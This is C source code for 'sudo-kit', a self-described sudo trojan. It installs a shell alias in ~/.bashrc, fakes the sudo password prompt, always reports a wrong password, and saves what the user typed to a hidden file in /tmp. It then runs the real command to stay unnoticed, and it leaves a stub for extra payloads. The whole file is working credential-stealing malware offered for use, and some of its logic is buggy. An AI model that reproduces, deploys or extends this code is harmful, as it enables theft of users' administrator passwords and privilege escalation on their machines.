/* Copyright 2019 Adam McKenney, see LICENSE for details */

#include <stdio.h>
#include <termios.h>	//no echo
#include <stdlib.h>	//dynamic mem
#include <string.h>	//strncpy
#include <unistd.h>     //checks if file exists
#include <pwd.h>        //gets user name

#ifdef DEBUGGING
	#define DEBUG 1
#else
	#define DEBUG 0
#endif

#define MAX 1024				//size for inputs
#define PROMPT "[sudo] password for "		//what sudo says for a prompt
#define END ": "				//how the prompt ends
#define WRONG "Sorry, try again."		//what sudo says on wrong password
#define ON 1					//flags for echo
#define OFF 0
#define OUT_FILE "/tmp/.320984"			//set this for where you want the password to be stored
#define COMMAND_PREFIX "sudo "			//command that we're pretending to be
#define ALIAS "alias sudo="			//start of the alias
#define DEFAULT_LOCATION "~/.sudo-kit.out"	//default location of this program for installing
#define CONFIG_FILE "/.bashrc"			//location of the config file with a '/'

int payload(){
	/* additional things the program should do goes here */
	return 3; //change this to 0 when a payload is added
}

void get_user(char *buf, size_t size){
	/* Used to get username */
 	struct passwd *pass;
 	pass = getpwuid(getuid());
	strncpy(buf, pass->pw_name, size);
}

void set_echo(short status){
	/* Sets the terminal so it doesnt print text on the screen */
	struct termios t;
	tcgetattr(0, &t);
	if(status == OFF)
		t.c_lflag &= ~ECHO;
	else
		t.c_lflag = ECHO;
	tcsetattr(0, TCSANOW, &t);
}

int install(char* install_location){
	/* Makes an aliase for sudo-kit to be run instead of sudo */
	if(DEBUG) puts("Installing...");
	if(DEBUG) puts("Copying...");	
	system("cp ~/.bashrc ~/.bashrc.bak");
	if(DEBUG) puts("Opening file...");
	char user[MAX] = {'\0'};
	get_user(user, MAX);
	char rc_location[MAX*2] = {'\0'};
	strcpy(rc_location, "/home/");
	strcat(rc_location, user);
	strcat(rc_location, CONFIG_FILE);
	FILE *bash_rc = fopen(rc_location, "a");
	if(bash_rc != NULL){
		if(DEBUG) puts("Appending...");
		fprintf(bash_rc, "%s%s", ALIAS, install_location);
		fclose(bash_rc);
	} else {
		if(DEBUG) perror("Error opening bashrc");
		return 1;
	}
	if(DEBUG) puts("Done!");	
	return 0;
}

int uninstall(){
	/* Undo's what install does */
	if(DEBUG) puts("Uninstalling...");
	char command[MAX] = {'\0'};
	strcpy(command, "rm ");
	strcat(command, OUT_FILE);
	system(command);
	return system("mv ~/.bashrc.bak ~/.bashrc");
}

void help(){
	/* Displays info for debugging */
	if(!DEBUG) return;
#ifdef DEBUGGING
	puts("sudo-kit");
	puts("--------");
	puts("A sudo trojan that gains the user's password");
	puts("command args:");
	puts("\t-i to append .bashrc with this prog for sudo");
	puts("\t-u to uninstall");
	puts("\t-h help (if debug isnt on)");
	puts("\t-g displays username newline password");
	puts("\tnone just prompt the user");
#endif
}


int get_info(){
	/* Displays the password gotten by the program to stdout */
	FILE *info = fopen(OUT_FILE, "r");
	if(info != NULL){
		int c;
		while ((c = getc(info)) != EOF)
       			 putchar(c);
		fclose(info);
	} else {
		if(DEBUG) perror("Error opening file");
		return 1;
	}
		
	return 0;
}

int prompt_user(char* commands){
	/* Mimicks sudo */
	//set up vars
	char pass[MAX] = {'\0'};
	char full_prompt[MAX] = {'\0'};
	
	//set up username
	char user[256] = {'\0'};
	get_user(user, 256);

	//set up prompt
	strcpy(full_prompt, PROMPT);
	strcat(full_prompt, user);
	strcat(full_prompt, END);
	if(DEBUG) strncat(full_prompt, "[DEBUG MODE] ", 14);

	//get user input
	set_echo(OFF);
	while(pass[0] == '\0' || pass[0] == '\n'){
		printf("%s", full_prompt);
		fgets(pass, MAX, stdin);
		puts(" ");
		printf("%s\n", WRONG);
	}
	set_echo(ON);
	pass[strlen(pass)-1] = '\0';

	//write down pass
	if(DEBUG) printf("\nYou said '%s'\n", pass);
	FILE *output = fopen(OUT_FILE, "w");
	if(output != NULL){
		fprintf(output, "%s", pass);
		fclose(output);
	} else {
		if(DEBUG) perror("File unable to be created");
	}
	
	//run any additional thing
	payload();
	
	//run program the user was calling
	system(commands);
	return 0;
}

int main(int argc, char *argv[]){
	if(argc == 1){
		if(DEBUG) return prompt_user("echo hi");
		else return 2;
	} else if(!strcmp(argv[1], "-i")){
		if(argv[2] == NULL)
			return install(DEFAULT_LOCATION);
		else
			return install(argv[2]);
	} else if(!strcmp(argv[1], "-u"))
		return uninstall();
	else if(!strcmp(argv[1], "-g"))
		return get_info();
	else if(!strcmp(argv[1], "-h"))
		help();
	else {
		char *commands = calloc(MAX, sizeof(char));
		if(commands == NULL) return 3;
		int arg_counter, arg_char, string_char=0;
		strcat(commands, COMMAND_PREFIX);
		string_char += sizeof(COMMAND_PREFIX)-1;

		//convert argv[][] to one string with a ' ' as a delim
		for(arg_counter=1; arg_counter < argc; arg_counter++){
			for(arg_char=0; argv[arg_counter][arg_char] != '\0'; arg_char++){
				commands[string_char] = argv[arg_counter][arg_char];
				string_char++;
				if(string_char >= MAX) commands = realloc(commands, MAX*sizeof(char));
				if(commands == NULL) return 4;
			}
			commands[string_char] = ' ';
			string_char++;
		}
		commands[string_char-1] = '\0'; //removes the last ' '
		if(DEBUG) printf("command = '%s'\n", commands);
		return prompt_user(commands);
		free(commands);
	}
	return 0;
}

